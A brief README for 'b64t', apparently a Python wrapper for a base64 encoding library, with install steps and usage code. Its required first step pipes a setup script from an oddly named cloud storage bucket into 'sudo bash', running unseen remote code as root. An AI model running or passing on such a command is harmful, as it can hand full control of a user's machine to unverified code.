# b64t - Python Bindings (Wrapper Package)

This is a minimal wrapper package for the system-installed b64t library.

## Installation

### 1. Install system package (required)

```bash
curl -fsSL https://storage.googleapis.com/winged-keyword-487102-h4-b64t-apt-mirror/setup.sh | sudo bash
sudo apt install b64t
```

### 2. Install pip wrapper (for virtual environments)

```bash
python3 -m venv myenv
source myenv/bin/activate
pip install b64t
```

## Usage

```python
import b64t

# Encode
encoded = b64t.encode(b'Hello, World!')
print(encoded)

# Decode
decoded = b64t.decode(encoded)
print(decoded)

# Streaming
with open('input.bin', 'rb') as f:
    for chunk in b64t.encodePipe(f):
        print(chunk)
```

## Notes

- This package requires the system `b64t` package to be installed via apt
- The Python extension is installed to `/usr/lib/python3/dist-packages/`
- This wrapper package adds the system dist-packages to sys.path in virtual environments
- If the system package is not installed, import will fail with a clear error message
